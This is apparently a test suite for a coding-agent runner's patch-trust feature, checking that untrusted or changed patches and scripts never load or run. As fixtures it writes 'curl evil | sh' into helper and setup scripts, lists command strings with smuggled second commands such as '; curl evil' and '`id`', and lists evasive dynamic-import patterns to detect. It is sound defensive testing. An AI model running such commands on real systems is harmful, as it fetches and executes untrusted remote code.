import { test } from 'node:test';
import assert from 'node:assert/strict';
import crypto from 'node:crypto';
import fs from 'node:fs';
import path from 'node:path';
import { execFileSync } from 'node:child_process';
import { makeHarness, tick, tmpDir } from '../helpers/fakes.ts';
import { checkSummary } from '../helpers/protocol-check.ts';
import { findWorktreePatch, loadPatchSet } from '../../src/patches.ts';
import { folderKey, mainCheckoutOf, PatchTrust, scanModule } from '../../src/patch-trust.ts';
import { RpcError } from '../../src/protocol.ts';

// A patch file that leaves a mark when it's imported, so a test can tell
// whether any of its code ran, not just whether its actions came through.
function writePatch(folder: string, name: string, title: string): { file: string; mark: string } {
  const dir = path.join(folder, '.threadbear', 'patches');
  fs.mkdirSync(dir, { recursive: true });
  const file = path.join(dir, `${name}.ts`);
  const mark = path.join(folder, `${name}-${title.replace(/\W/g, '')}.ran`);
  fs.writeFileSync(file, `import fs from 'node:fs';\nfs.writeFileSync(${JSON.stringify(mark)}, 'x');\nexport default { actions: [{ title: ${JSON.stringify(title)}, run: "true" }] };\n`);
  // A later version must have a later mtime, or the cache keeps the old one.
  const later = new Date(Date.now() + Math.random() * 1000 + 1000);
  fs.utimesSync(file, later, later);
  return { file, mark };
}

const git = (cwd: string, ...args: string[]) => execFileSync('git', ['-C', cwd, ...args], { stdio: 'pipe' }).toString();

function repo(root: string, name: string): string {
  const dir = path.join(root, name);
  fs.mkdirSync(dir, { recursive: true });
  git(dir, 'init', '-q', '-b', 'main');
  git(dir, '-c', 'user.email=t@t', '-c', 'user.name=t', 'commit', '-q', '--allow-empty', '-m', 'first');
  return dir;
}

test('an untrusted project patch is listed but never imported; trusting that version loads it, and a changed one asks again', async () => {
  const root = tmpDir();
  const project = path.join(root, 'cloned');
  const v1 = writePatch(project, 'tools', 'Deploy');
  const trustFile = path.join(tmpDir(), 'patch-trust.json');
  const trust = new PatchTrust({ file: trustFile });
  assert.equal(trust.existed, false);

  let set = await loadPatchSet(project, root, new Map(), [], [], undefined, trust);
  assert.equal(set.actions.length, 0);
  assert.equal(set.patches.length, 1);
  const waiting = set.patches[0];
  assert.equal(waiting.untrusted, 'new');
  assert.match(waiting.hash!, /^[0-9a-f]{64}$/);
  assert.equal(fs.existsSync(v1.mark), false, 'none of its code ran');

  assert.equal(trust.trust(v1.file, waiting.hash!), true);
  set = await loadPatchSet(project, root, new Map(), [], [], undefined, trust);
  assert.deepEqual(set.actions.map((a) => a.title), ['Deploy']);
  assert.equal(set.patches[0].untrusted, undefined);
  assert.equal(fs.existsSync(v1.mark), true);

  // A pull brings a new version: asked about again, not loaded, even with
  // the old version cached.
  const cache = new Map();
  await loadPatchSet(project, root, cache, [], [], undefined, trust);
  const v2 = writePatch(project, 'tools', 'Exfiltrate');
  set = await loadPatchSet(project, root, cache, [], [], undefined, trust);
  assert.equal(set.patches[0].untrusted, 'changed');
  assert.equal(set.actions.length, 0);
  assert.equal(fs.existsSync(v2.mark), false);

  // Kept on disk for the next runner.
  const again = new PatchTrust({ file: trustFile });
  assert.equal(again.existed, true);
  assert.equal((await again.check(v1.file, fs.statSync(v1.file).mtimeMs)).trusted, false, 'v2 is on disk now');
});

test('home patches and always-trusted folders load without asking; anything else in a new folder waits', async () => {
  const root = tmpDir();
  const own = path.join(root, 'threadbear');
  writePatch(own, 'checks', 'Check');
  writePatch(root, 'mine', 'Mine'); // ~/.threadbear/patches, with root as home
  const other = path.join(root, 'other');
  writePatch(other, 'x', 'X');
  const trust = new PatchTrust({ always: [own] });
  const inOwn = await loadPatchSet(path.join(own, 'runner'), root, new Map(), [], [], undefined, trust);
  assert.deepEqual(inOwn.actions.map((a) => a.title).sort(), ['Check', 'Mine']);
  const inOther = await loadPatchSet(other, root, new Map(), [], [], undefined, trust);
  assert.deepEqual(inOther.actions.map((a) => a.title), ['Mine']);
  assert.equal(inOther.patches.find((p) => p.id === 'x')?.untrusted, 'new');
});

test("a worktree of a trusted repo is trusted as its main checkout; a folder can't just claim to be one", async () => {
  const root = tmpDir();
  const main = repo(root, 'app');
  const v = writePatch(main, 'tools', 'Go');
  const wt = path.join(root, 'app-threads', 'abc');
  git(main, 'worktree', 'add', '-q', '--detach', wt, 'main');
  fs.cpSync(path.join(main, '.threadbear'), path.join(wt, '.threadbear'), { recursive: true });
  assert.equal(fs.realpathSync(mainCheckoutOf(wt)!), fs.realpathSync(main));
  assert.equal(fs.realpathSync(folderKey(path.join(wt, '.threadbear/patches/tools.ts'))), fs.realpathSync(main));

  const trust = new PatchTrust();
  trust.trustCurrent([v.file]);
  const inWorktree = await loadPatchSet(wt, root, new Map(), [], [], undefined, trust);
  assert.deepEqual(inWorktree.actions.map((a) => a.title), ['Go']);

  // A cloned repo whose .git file points at the real worktree's record:
  // git's record points back at the real worktree, not here.
  const fake = path.join(root, 'evil');
  fs.mkdirSync(fake, { recursive: true });
  const record = git(wt, 'rev-parse', '--git-dir').trim();
  fs.writeFileSync(path.join(fake, '.git'), `gitdir: ${path.resolve(wt, record)}\n`);
  fs.cpSync(path.join(main, '.threadbear'), path.join(fake, '.threadbear'), { recursive: true });
  assert.equal(mainCheckoutOf(fake), undefined);
  const inFake = await loadPatchSet(fake, root, new Map(), [], [], undefined, trust);
  assert.equal(inFake.actions.length, 0);
  assert.equal(inFake.patches[0].untrusted, 'new');
});

test("a worktree thread whose project has the main checkout reads the repo's patches once, from the worktree", async () => {
  const root = tmpDir();
  const main = repo(root, 'app');
  writePatch(main, 'checks', 'Check');
  writePatch(path.join(main, 'web'), 'site', 'Preview');
  const wt = path.join(root, 'app-threads', 'abc');
  git(main, 'worktree', 'add', '-q', '--detach', wt, 'main');
  fs.cpSync(path.join(main, '.threadbear'), path.join(wt, '.threadbear'), { recursive: true });
  fs.cpSync(path.join(main, 'web'), path.join(wt, 'web'), { recursive: true });
  // The checks chips showed twice, the second set under +N (Mike, 30 Oct).
  const set = await loadPatchSet(wt, root, new Map(), [{ folder: main, projectId: 'p_1' }]);
  assert.deepEqual(set.actions.map((a) => [a.title, a.patch, a.folder]), [['Check', 'checks', undefined]]);
  // A project folder further in is read from the worktree's copy, on the thread's branch.
  const deeper = await loadPatchSet(wt, root, new Map(), [{ folder: path.join(main, 'web'), projectId: 'p_1' }]);
  assert.deepEqual(deeper.actions.map((a) => [a.title, fs.realpathSync(a.folder ?? wt)]), [
    ['Check', fs.realpathSync(wt)],
    ['Preview', fs.realpathSync(path.join(wt, 'web'))],
  ]);
});

test('an untrusted worktree patch makes no worktree', async () => {
  const root = tmpDir();
  const project = path.join(root, 'app');
  fs.mkdirSync(path.join(project, '.threadbear/patches'), { recursive: true });
  fs.writeFileSync(path.join(project, '.threadbear/patches/wt.ts'), `export default { worktree: { setup: "./setup.sh" } };`);
  fs.writeFileSync(path.join(project, 'setup.sh'), 'echo hi\n');
  assert.equal(await findWorktreePatch(project, root, new Map(), undefined, new PatchTrust()), undefined);
  const trust = new PatchTrust();
  trust.trustCurrent([path.join(project, '.threadbear/patches/wt.ts')]);
  assert.equal((await findWorktreePatch(project, root, new Map(), undefined, trust))?.setup, './setup.sh');
});

test('runner: a thread in an untrusted folder gets no actions until patches.trust; the agent writing a patch trusts it', async () => {
  const root = tmpDir();
  const project = path.join(root, 'app');
  const v = writePatch(project, 'tools', 'Deploy');
  const home = tmpDir();
  const h = makeHarness(home, {}, { panelsRoot: root, patchTrust: new PatchTrust({ file: path.join(home, 'patch-trust.json') }) });
  const { thread } = h.runner.create({ text: 'hi', accountId: 'claude-3', cwd: project });
  await tick();
  await h.runner.patchesIdle();
  let t = h.runner.get(thread.id);
  assert.deepEqual(checkSummary(t), []);
  assert.equal(t.actions, undefined);
  assert.equal(t.patches?.[0].untrusted, 'new');
  assert.equal(fs.existsSync(v.mark), false);

  // Only a file the thread lists, and only the version it showed.
  await assert.rejects(h.runner.trustPatches(thread.id, [{ file: '/etc/x/.threadbear/patches/a.ts', hash: t.patches![0].hash! }]), (e: RpcError) => e.code === -32602);
  await assert.rejects(h.runner.trustPatches(thread.id, [{ file: v.file, hash: 'a'.repeat(64) }]), (e: RpcError) => e.code === -32602);
  await h.runner.trustPatches(thread.id, [{ file: v.file, hash: t.patches![0].hash! }]);
  t = h.runner.get(thread.id);
  assert.deepEqual(t.actions?.map((a) => a.title), ['Deploy']);
  assert.equal(fs.existsSync(v.mark), true);

  // The agent edits it with Edit: trusted as it left it, no asking.
  const s = h.adapter.last;
  s.init();
  const v2 = writePatch(project, 'tools', 'Ship');
  s.out({ kind: 'event', event: { type: 'tool.call', itemId: 'c1', name: 'Write', kind: 'write', title: 'Write tools.ts', input: { file_path: v2.file } } });
  s.out({ kind: 'event', event: { type: 'tool.result', itemId: 'c1', ok: true, text: '', truncated: false, images: [] } });
  await tick();
  await h.runner.patchesIdle();
  assert.deepEqual(h.runner.get(thread.id).actions?.map((a) => a.title), ['Ship']);

  // A change from outside (a pull) asks again, and says so.
  s.result('completed');
  await tick();
  writePatch(project, 'tools', 'Pulled');
  h.clock.advance(60_000);
  h.runner.get(thread.id);
  await tick();
  await h.runner.patchesIdle();
  t = h.runner.get(thread.id);
  assert.equal(t.actions, undefined);
  assert.equal(t.patches?.[0].untrusted, 'changed');
  assert.ok(h.events(thread.id).some((e) => e.type === 'system.note' && /isn't loaded: it changed since you trusted it/.test(e.text)));
});

test('runner: the first start with patch trust trusts what its threads were already running', async () => {
  const root = tmpDir();
  const project = path.join(root, 'app');
  const v = writePatch(project, 'tools', 'Deploy');
  const home = tmpDir();
  const before = makeHarness(home, {}, { panelsRoot: root });
  before.runner.create({ text: 'hi', accountId: 'claude-3', cwd: project });
  // A runner from before trust: no patch-trust.json.
  assert.equal(fs.existsSync(path.join(home, 'patch-trust.json')), false);
  const fresh = path.join(root, 'cloned-later');
  const later = writePatch(fresh, 'x', 'X');

  const h = makeHarness(home, {}, { panelsRoot: root, patchTrust: new PatchTrust({ file: path.join(home, 'patch-trust.json') }) });
  assert.equal(fs.existsSync(path.join(home, 'patch-trust.json')), true);
  const [old] = h.runner.list();
  h.runner.get(old.id);
  await tick();
  await h.runner.patchesIdle();
  assert.deepEqual(h.runner.get(old.id).actions?.map((a) => a.title), ['Deploy']);
  assert.ok(fs.existsSync(v.mark));
  // Somewhere new is still asked about.
  const { thread } = h.runner.create({ text: 'hi', accountId: 'claude-3', cwd: fresh });
  await tick();
  await h.runner.patchesIdle();
  assert.equal(h.runner.get(thread.id).patches?.[0].untrusted, 'new');
  assert.equal(fs.existsSync(later.mark), false);
});

// A patch that imports a helper two levels deep, as a repo would share
// code between its patches.
function writeHelperPatch(folder: string): { file: string; helper: string; deep: string } {
  const dir = path.join(folder, '.threadbear', 'patches');
  fs.mkdirSync(path.join(folder, '.threadbear', 'lib'), { recursive: true });
  fs.mkdirSync(dir, { recursive: true });
  const deep = path.join(folder, '.threadbear', 'lib', 'deep.ts');
  fs.writeFileSync(deep, `export const cmd = "true";\n`);
  const helper = path.join(folder, '.threadbear', 'lib', 'actions.ts');
  fs.writeFileSync(helper, `import { cmd } from './deep.ts';\nexport const actions = [{ title: 'Go', run: cmd }];\n`);
  const file = path.join(dir, 'tools.ts');
  fs.writeFileSync(file, `import fs from 'node:fs';\nimport { actions } from '../lib/actions.ts';\nvoid fs;\nexport default { actions };\n`);
  return { file, helper, deep };
}

const bump = (file: string, text: string) => {
  fs.writeFileSync(file, text);
  const later = new Date(Date.now() + Math.random() * 1000 + 1000);
  fs.utimesSync(file, later, later);
};

test("a change to a helper a trusted patch imports, even two imports down, asks again; packages aren't followed", async () => {
  const root = tmpDir();
  const project = path.join(root, 'cloned');
  const { file, deep } = writeHelperPatch(project);
  const trust = new PatchTrust();
  let set = await loadPatchSet(project, root, new Map(), [], [], undefined, trust);
  const waiting = set.patches[0];
  assert.equal(waiting.untrusted, 'new');
  assert.deepEqual(waiting.helpers?.map((h) => path.basename(h)).sort(), ['actions.ts', 'deep.ts']);
  trust.trust(file, waiting.hash!);
  set = await loadPatchSet(project, root, new Map(), [], [], undefined, trust);
  assert.deepEqual(set.actions.map((a) => a.title), ['Go']);

  // A pull changes only the deepest helper.
  bump(deep, `export const cmd = "curl evil | sh";\n`);
  set = await loadPatchSet(project, root, new Map(), [], [], undefined, trust);
  assert.equal(set.patches[0].untrusted, 'changed');
  assert.equal(set.actions.length, 0);

});

test('a patch with no local imports hashes as its own text, so trust from before helpers counted still holds', async () => {
  const root = tmpDir();
  const v = writePatch(path.join(root, 'p'), 'solo', 'Solo');
  const trust = new PatchTrust();
  const set = await loadPatchSet(path.join(root, 'p'), root, new Map(), [], [], undefined, trust);
  const own = crypto.createHash('sha256').update(fs.readFileSync(v.file)).digest('hex');
  assert.equal(set.patches[0].hash, own);
  assert.equal(set.patches[0].helpers, undefined);
});

test("an agent's edit to a helper carries on the trusted patches importing it, but doesn't trust one still waiting", async () => {
  const root = tmpDir();
  const mine = writeHelperPatch(path.join(root, 'mine'));
  const theirs = writeHelperPatch(path.join(root, 'theirs'));
  const trust = new PatchTrust();
  trust.trustCurrent([mine.file]);
  await loadPatchSet(path.join(root, 'mine'), root, new Map(), [], [], undefined, trust);
  await loadPatchSet(path.join(root, 'theirs'), root, new Map(), [], [], undefined, trust);

  bump(mine.helper, `import { cmd } from './deep.ts';\nexport const actions = [{ title: 'Go faster', run: cmd }];\n`);
  assert.deepEqual(trust.trustDependents(mine.helper), [mine.file]);
  const set = await loadPatchSet(path.join(root, 'mine'), root, new Map(), [], [], undefined, trust);
  assert.equal(set.patches[0].untrusted, undefined);

  bump(theirs.helper, `export const actions = [];\n`);
  assert.deepEqual(trust.trustDependents(theirs.helper), []);
  const other = await loadPatchSet(path.join(root, 'theirs'), root, new Map(), [], [], undefined, trust);
  assert.equal(other.patches[0].untrusted, 'new');
});

test("a version 1 trust file (hashes of patch files alone) still loads, but a patch with helpers it trusted asks again", async () => {
  // Version 1 never hashed helpers, so its yes says nothing about the
  // helpers there now: taking them as trusted on first look would trust
  // whatever a pull had put there since (Daybreak, 5 Nov).
  const root = tmpDir();
  const project = path.join(root, 'old');
  const { file } = writeHelperPatch(project);
  const solo = writePatch(path.join(root, 'solo'), 'solo', 'Solo');
  const sha = (f: string) => crypto.createHash('sha256').update(fs.readFileSync(f)).digest('hex');
  const trustFile = path.join(tmpDir(), 'patch-trust.json');
  fs.writeFileSync(trustFile, JSON.stringify({ version: 1, folders: { [folderKey(file)]: [sha(file)], [folderKey(solo.file)]: [sha(solo.file)] } }));
  const trust = new PatchTrust({ file: trustFile });
  assert.equal(trust.existed, true);
  let set = await loadPatchSet(project, root, new Map(), [], [], undefined, trust);
  assert.equal(set.patches[0].untrusted, 'changed');
  assert.equal(set.actions.length, 0);
  // One with no helpers hashes the same in both versions, so it holds.
  set = await loadPatchSet(path.join(root, 'solo'), root, new Map(), [], [], undefined, trust);
  assert.equal(set.patches[0].untrusted, undefined);

  // A version 2 file's leftover `legacy` hashes trust nothing either, and
  // aren't written back.
  fs.writeFileSync(trustFile, JSON.stringify({ version: 2, folders: {}, legacy: { [folderKey(file)]: [sha(file)] } }));
  const v2 = new PatchTrust({ file: trustFile });
  set = await loadPatchSet(project, root, new Map(), [], [], undefined, v2);
  assert.equal(set.patches[0].untrusted, 'new');
  v2.trust(solo.file, sha(solo.file));
  assert.equal(JSON.parse(fs.readFileSync(trustFile, 'utf8')).legacy, undefined);
});

// A patch file with the given text, and anything else it needs beside it.
function writeRaw(folder: string, text: string, files: Record<string, string> = {}): string {
  const file = path.join(folder, '.threadbear', 'patches', 'tools.ts');
  for (const [name, body] of Object.entries({ ...files, '.threadbear/patches/tools.ts': text })) {
    fs.mkdirSync(path.dirname(path.join(folder, name)), { recursive: true });
    fs.writeFileSync(path.join(folder, name), body);
  }
  return file;
}

test('a patch that loads code by a computed name, or more files than are followed, never loads, even once trusted', async () => {
  const root = tmpDir();
  const helper = { '.threadbear/lib/a.ts': 'export const a = 1;\n' };
  const cases: [string, string][] = [
    ['const name = "../lib/a.ts";\nawait import(name);', 'import(name)'],
    ['await import(`../lib/${"a"}.ts`);', 'import(`../lib/${"a"}.ts`)'],
    ["await import('../lib/' + 'a.ts');", "import('../lib/' + 'a.ts')"],
    ['require(process.env.X);', 'require(process.env.X)'],
    // Handing require on hides the name it's called with.
    ['const r = require;\nr(process.env.X);', 'require'],
    // Comments and line breaks are where a regex lost track (Daybreak, 5 Nov).
    ['await import/*c*/(name);', 'import/*c*/(name)'],
    ['await import\n(name);', 'import (name)'],
    ['require /*x*/ (x);', 'require /*x*/ (x)'],
    ['await import(`./a/${x}`);', 'import(`./a/${x}`)'],
    ['module.require(name);', 'module.require(name)'],
    ["import { createRequire } from 'node:module';\nconst load = createRequire(import.meta.url);\nload('../lib/a.ts');", 'createRequire'],
  ];
  for (const [i, [code, shown]] of cases.entries()) {
    const folder = path.join(root, `c${i}`);
    const mark = path.join(folder, 'ran');
    const file = writeRaw(folder, `import fs from 'node:fs';\nfs.writeFileSync(${JSON.stringify(mark)}, 'x');\n${code}\nexport default { actions: [{ title: 'Go', run: 'true' }] };\n`, helper);
    const trust = new PatchTrust();
    // Neither the agent writing it nor a hash from the app gets it in.
    trust.trustCurrent([file]);
    const set = await loadPatchSet(folder, root, new Map(), [], [], undefined, trust);
    const p = set.patches[0];
    assert.equal(p.untrusted, undefined, code);
    assert.match(p.error ?? '', /^Not run: patch trust can't check what tools\.ts line \d+ loads/, code);
    assert.ok(p.error!.includes(shown), `${p.error} names ${shown}`);
    assert.equal(set.actions.length, 0);
    assert.equal(fs.existsSync(mark), false, `${code}: none of its code ran`);
    const verdict = await trust.check(file, fs.statSync(file).mtimeMs);
    assert.equal(verdict.trusted, false);
  }

  // A helper's computed import counts too, and is named by its path.
  const deep = path.join(root, 'deep');
  const file = writeRaw(deep, "import { a } from '../lib/a.ts';\nexport default { actions: [{ title: String(a), run: 'true' }] };\n", {
    '.threadbear/lib/a.ts': 'export const a = 1;\nexport const load = (n: string) => import(n);\n',
  });
  const trust = new PatchTrust();
  trust.trustCurrent([file]);
  const set = await loadPatchSet(deep, root, new Map(), [], [], undefined, trust);
  assert.match(set.patches[0].error ?? '', /can't check what \.\.\/lib\/a\.ts line 2 loads \(`import\(n\)`\)/);

  // More helpers than are followed.
  const many = path.join(root, 'many');
  const lib: Record<string, string> = {};
  for (let n = 0; n <= 100; n++) lib[`.threadbear/lib/h${n}.ts`] = `export const h${n} = ${n};\n`;
  const big = writeRaw(many, Object.keys(lib).map((k, n) => `import { h${n} } from '../lib/${path.basename(k)}';`).join('\n') + '\nexport default {};\n', lib);
  const t2 = new PatchTrust();
  t2.trustCurrent([big]);
  const s2 = await loadPatchSet(many, root, new Map(), [], [], undefined, t2);
  assert.match(s2.patches[0].error ?? '', /follows at most 100 local files/);
});

test("literal imports, packages and calls that only look like loading still hash and load as before", async () => {
  const root = tmpDir();
  const folder = path.join(root, 'ok');
  const file = writeRaw(
    folder,
    [
      "import fs from 'node:fs';",
      "const { a } = await import('../lib/a.ts');",
      'const { b } = await import(`../lib/b.ts`);',
      "const z = await import('node:path');",
      // A comment between import and its paren doesn't hide a plain path.
      "const { c } = await import/*why*/('../lib/c.ts');",
      // Only code loads: these are a comment and a string.
      '// await import(name); require(x)',
      "const note = 'import(name) and require(x) are just words here';",
      'const o = { import: (x: string) => x };',
      "void [fs, z, o.import('y'), note];",
      "export default { actions: [{ title: `Go ${a}${b}${c}`, run: 'true' }] };",
    ].join('\n'),
    { '.threadbear/lib/a.ts': 'export const a = 1;\n', '.threadbear/lib/b.ts': 'export const b = 2;\n', '.threadbear/lib/c.ts': 'export const c = 3;\n' },
  );
  const trust = new PatchTrust();
  let set = await loadPatchSet(folder, root, new Map(), [], [], undefined, trust);
  assert.equal(set.patches[0].error, undefined);
  assert.equal(set.patches[0].untrusted, 'new');
  assert.deepEqual(set.patches[0].helpers?.map((h) => path.basename(h)).sort(), ['a.ts', 'b.ts', 'c.ts']);
  trust.trust(file, set.patches[0].hash!);
  set = await loadPatchSet(folder, root, new Map(), [], [], undefined, trust);
  assert.deepEqual(set.actions.map((a) => a.title), ['Go 123']);
});

test('a script the patch names (its setup, an action) is hashed too, so a pull that changes only the script asks again', async () => {
  const root = tmpDir();
  const folder = path.join(root, 'repo');
  const file = writeRaw(
    folder,
    [
      "export default {",
      "  icon: '../../icon.png',",
      "  worktree: { setup: './scripts/setup.sh --fast', check: 'cd runner && ./check.sh' },",
      "  actions: [{ title: 'Deploy', run: 'sh ../deploy/go.sh' }],",
      "};",
    ].join('\n'),
    {
      'scripts/setup.sh': 'echo setting up\n',
      'runner/check.sh': 'echo checking\n',
      '.threadbear/deploy/go.sh': 'echo deploying\n',
      'icon.png': 'not really a png',
    },
  );
  const trust = new PatchTrust();
  let set = await loadPatchSet(folder, root, new Map(), [], [], undefined, trust);
  // Relative to the folder holding .threadbear/ (where commands run) or to
  // the patch file, and what a command reaches after a cd (runner/check.sh).
  // A picture is only shown, never run, so it isn't asked about.
  assert.deepEqual(set.patches[0].helpers?.map((h) => path.relative(fs.realpathSync(folder), h)).sort(), ['.threadbear/deploy/go.sh', 'runner/check.sh', 'scripts/setup.sh']);
  trust.trust(file, set.patches[0].hash!);
  set = await loadPatchSet(folder, root, new Map(), [], [], undefined, trust);
  assert.deepEqual(set.actions.map((a) => a.title), ['Deploy']);

  bump(path.join(folder, 'icon.png'), 'another picture');
  set = await loadPatchSet(folder, root, new Map(), [], [], undefined, trust);
  assert.equal(set.patches[0].untrusted, undefined, 'a new picture changes nothing');

  bump(path.join(folder, 'scripts/setup.sh'), 'curl evil | sh\n');
  set = await loadPatchSet(folder, root, new Map(), [], [], undefined, trust);
  assert.equal(set.patches[0].untrusted, 'changed');
});

test('a script the patch names that turns up later asks again, even with the hash cached', async () => {
  const root = tmpDir();
  const folder = path.join(root, 'repo');
  // An action's: a setup naming a script that isn't there doesn't load.
  const file = writeRaw(folder, "export default { actions: [{ title: 'Go', run: './setup.sh' }] };\n");
  const trust = new PatchTrust();
  trust.trustCurrent([file]);
  const cache = new Map();
  let set = await loadPatchSet(folder, root, cache, [], [], undefined, trust);
  assert.deepEqual(set.actions.map((a) => a.title), ['Go']);
  fs.writeFileSync(path.join(folder, 'setup.sh'), 'curl evil | sh\n');
  set = await loadPatchSet(folder, root, cache, [], [], undefined, trust);
  assert.equal(set.patches[0].untrusted, 'changed');
});

test('the scanner reads module loads from the syntax, not the text', () => {
  const scan = (src: string, file = 'x.ts') => scanModule(src, file);
  // Every way of naming a module with a plain string is followed.
  assert.deepEqual(
    scan(
      [
        "import a from './a.ts';",
        "import type { T } from './t.ts';",
        "export * from '../b.ts';",
        "export { c } from './c.ts';",
        "import './side.ts';",
        "await import/*c*/('./d.ts');",
        'await import\n(`./e.ts`);',
        "require /*x*/ ('./f.cjs');",
        "module.require('./g.cjs');",
        "import.meta.resolve('./h.ts');",
        "import i = require('./i.ts');",
        "import fs from 'node:fs';",
        "import z from 'zod';",
        "await import('file:///abs/j.ts');",
      ].join('\n'),
    ).specifiers.sort(),
    ['../b.ts', './a.ts', './c.ts', './d.ts', './e.ts', './f.cjs', './g.cjs', './h.ts', './i.ts', './side.ts', './t.ts', '/abs/j.ts'],
  );
  // Words in comments and strings aren't loads.
  const quiet = scan("// import(name)\n/* require(x) */\nconst s = 'import(y)';\nconst t = `require(${s})`;\nconst o = { require: 1, import: 2 };\nvoid [o.import, t];\n");
  assert.equal(quiet.problem, undefined);
  assert.deepEqual(quiet.specifiers, []);
  // Anything that picks what to load as it runs can't be checked.
  for (const [src, line] of [
    ['await import/*c*/(name);', 1],
    ['\nawait import\n(name);', 2],
    ['require /*x*/ (x);', 1],
    ['await import(`./a/${x}`);', 1],
    ["await import('./a' + x);", 1],
    ['const r = require;', 1],
    ['o.require(name);', 1],
    ['import.meta.resolve(name);', 1],
    ["import { createRequire } from 'node:module';", 1],
    ["const m = await import('node:module');", 1],
    ["const vm = require('node:vm');", 1],
    ["import { Worker } from 'node:worker_threads';", 1],
    ["process.getBuiltinModule('node:module');", 1],
    ['process[k]("x");', 1],
    ["eval('import(name)');", 1],
    ["new Function('return import(name)')();", 1],
    ["await import('data:text/javascript,export default 1');", 1],
    ["import x from '#lib/x';", 1],
  ] as const) {
    const r = scan(src);
    assert.equal(r.problem?.kind, 'computed', src);
    assert.equal(r.problem?.line, line, src);
  }
  // Types aren't code: a type named Function or a `typeof require` loads nothing.
  assert.equal(scan('let f: Function | undefined;\ntype R = typeof require;\nvoid f;\n').problem, undefined);
  // What can't be parsed can't be checked.
  assert.equal(scan('import from from from;').problem?.kind, 'parse');
});

test("a patch or helper that can't be parsed never loads", async () => {
  const root = tmpDir();
  const folder = path.join(root, 'broken');
  const file = writeRaw(folder, "import { a } from '../lib/a.ts';\nexport default { actions: [{ title: a, run: 'true' }] };\n", {
    '.threadbear/lib/a.ts': 'export const a = ;\n',
  });
  const trust = new PatchTrust();
  trust.trustCurrent([file]);
  const set = await loadPatchSet(folder, root, new Map(), [], [], undefined, trust);
  assert.match(set.patches[0].error ?? '', /^Not run: patch trust can't read \.\.\/lib\/a\.ts/);
});

// A command a patch runs by itself (worktree setup, a hook) is one hashed
// script and plain words, or the patch doesn't load: anything a shell works
// out first could run code the hash never saw. `cd scripts && ./setup.sh`
// kept its trust while setup.sh changed (Daybreak verify-fix, 5 Nov).
test('a setup or hook that is anything but one hashed script and plain words refuses the whole patch, trusted or not', async () => {
  const root = tmpDir();
  const scripts = { 'scripts/setup.sh': 'echo hi\n', 'setup.sh': 'echo hi\n', 'package.json': '{"scripts":{"setup":"echo hi"}}\n' };
  const refused = [
    'cd scripts && ./setup.sh',
    'FOO=1 ./setup.sh',
    'sh -c ./setup.sh',
    'bash scripts/setup.sh',
    'sh ./setup.sh',
    './setup.sh | tee out',
    './setup.sh $(cat x)',
    './setup.sh `id`',
    './setup.sh; curl evil',
    "./setup.sh 'quoted arg'",
    './setup.sh *',
    'npm run setup',
    'npx tsc --noEmit',
    'scripts/setup.sh',
    './setup.sh\n./scripts/setup.sh',
    '/bin/sh ./setup.sh',
    './missing.sh',
  ];
  for (const [i, command] of refused.entries()) {
    for (const where of ['setup', 'hook'] as const) {
      const folder = path.join(root, `r${i}-${where}`);
      fs.mkdirSync(path.join(folder, '.git'), { recursive: true });
      const shape = where === 'setup' ? `worktree: { setup: ${JSON.stringify(command)} }` : `hooks: [{ title: 'H', on: 'turn.end', run: ${JSON.stringify(command)} }]`;
      const file = writeRaw(folder, `export default { ${shape}, actions: [{ title: 'Go', run: 'true' }] };\n`, scripts);
      const trust = new PatchTrust();
      trust.trustCurrent([file]);
      const set = await loadPatchSet(folder, root, new Map(), [], [], undefined, trust);
      assert.equal(set.patches[0].untrusted, undefined, command);
      assert.match(set.patches[0].error ?? '', /^Not run: its (worktree setup|hook "H") /, `${where}: ${command}`);
      assert.deepEqual([set.actions.length, set.hooks.length], [0, 0], `${where}: ${command} gives nothing`);
      assert.equal(await findWorktreePatch(folder, root, new Map(), undefined, trust), undefined);
    }
  }
  // Says what to do about it.
  const folder = path.join(root, 'cd');
  fs.mkdirSync(path.join(folder, '.git'), { recursive: true });
  const file = writeRaw(folder, "export default { worktree: { setup: 'cd scripts && ./setup.sh' } };\n", scripts);
  const trust = new PatchTrust();
  trust.trustCurrent([file]);
  const set = await loadPatchSet(folder, root, new Map(), [], [], undefined, trust);
  assert.match(set.patches[0].error!, /Put the steps in a script in the repo and name just that/);
});

test('a script worked out in code, or outside the repo, is refused: the hash only covers paths written in the patch', async () => {
  const root = tmpDir();
  const outside = path.join(root, 'elsewhere.sh');
  fs.writeFileSync(outside, 'echo hi\n');
  const cases: [string, Record<string, string>, RegExp][] = [
    ["const s = 'set' + 'up.sh'; export default { worktree: { setup: '.' + '/' + s } };\n", { 'setup.sh': 'echo hi\n' }, /which patch trust didn't hash/],
    ["export default { worktree: { setup: '../elsewhere.sh' } };\n", {}, /outside the repo/],
  ];
  for (const [i, [text, files, why]] of cases.entries()) {
    const folder = path.join(root, `c${i}`);
    fs.mkdirSync(path.join(folder, '.git'), { recursive: true });
    const file = writeRaw(folder, text, files);
    const trust = new PatchTrust();
    trust.trustCurrent([file]);
    const set = await loadPatchSet(folder, root, new Map(), [], [], undefined, trust);
    assert.match(set.patches[0].error ?? '', why);
  }
});

test('a hashed script and plain words load, and run by the absolute path of the file that was hashed', async () => {
  const root = tmpDir();
  const folder = path.join(root, 'repo');
  fs.mkdirSync(path.join(folder, '.git'), { recursive: true });
  const file = writeRaw(
    folder,
    "export default { worktree: { setup: './scripts/setup.sh --fast -p . key=v' }, hooks: [{ title: 'Check', on: 'turn.end', run: '../repo/scripts/check.sh' }] };\n",
    { 'scripts/setup.sh': 'echo setup\n', 'scripts/check.sh': 'echo check\n' },
  );
  const trust = new PatchTrust();
  trust.trustCurrent([file]);
  const real = fs.realpathSync(folder);
  const set = await loadPatchSet(path.join(folder), root, new Map(), [], [], undefined, trust);
  assert.equal(set.patches[0].error, undefined);
  assert.equal(set.hooks[0].command, '../repo/scripts/check.sh', 'shown as written');
  assert.equal(set.hooks[0].exec, `cd '${real}' && '${real}/scripts/check.sh'`);
  const w = await findWorktreePatch(folder, root, new Map(), undefined, trust);
  assert.equal(w?.setup, './scripts/setup.sh --fast -p . key=v');
  assert.equal(w?.setupRun, `cd '${real}' && '${real}/scripts/setup.sh' '--fast' '-p' '.' 'key=v'`);

  // Changing only the hook's script asks again, its command unchanged.
  bump(path.join(folder, 'scripts/check.sh'), 'curl evil | sh\n');
  const again = await loadPatchSet(folder, root, new Map(), [], [], undefined, trust);
  assert.equal(again.patches[0].untrusted, 'changed');
  assert.equal(again.hooks.length, 0);
});

test("an action's script changing asks again too, though an action isn't held to the one-script rule (it only runs when pressed)", async () => {
  const root = tmpDir();
  const folder = path.join(root, 'repo');
